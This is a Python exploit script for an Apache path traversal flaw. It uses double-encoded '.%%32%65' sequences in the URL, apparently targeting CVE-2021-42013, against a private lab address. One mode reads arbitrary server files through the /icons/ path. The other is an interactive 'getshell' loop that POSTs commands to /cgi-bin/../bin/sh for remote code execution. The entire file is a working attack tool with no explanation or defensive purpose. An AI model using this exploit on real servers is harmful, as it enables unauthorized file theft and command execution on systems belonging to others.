from urllib import request
import urllib.parse  
import urllib.request  
from urllib.parse import urlencode

def cmd():
    while True:
        cmd=input("$:")
        if (cmd=="exit"):
            exit()
        else:
            pass

        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}
        proxy = '127.0.0.1:8080'
        proxy_values = "%(ip)s" % {'ip': proxy}
        proxies = {"http": proxy_values, "https": proxy_values}
        handler = urllib.request.ProxyHandler(proxies)
        opener = urllib.request.build_opener(handler)
        req = urllib.request.Request('http://192.168.41.6:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh', headers=headers,method="POST",data=("echo;"+cmd).encode())
        res = opener.open(req)
        print(res.read().decode('utf-8'))

def catfile():
    file=input("path:")
    if (cmd=="exit"):
        exit()
    else:
        pass
    req = request.Request('http://192.168.41.6:8080/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/'+file)
    req.add_header('User-Agent', 'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25')
    with request.urlopen(req) as f:
        print('Status:', f.status, f.reason)
        for k, v in f.getheaders():
            print('%s: %s' % (k, v))
        print('Data:', f.read().decode('utf-8'))



print("""1.cat file
2.getshell""")
num=input()
if num=="1":
    catfile()
elif num=="2":
    cmd()
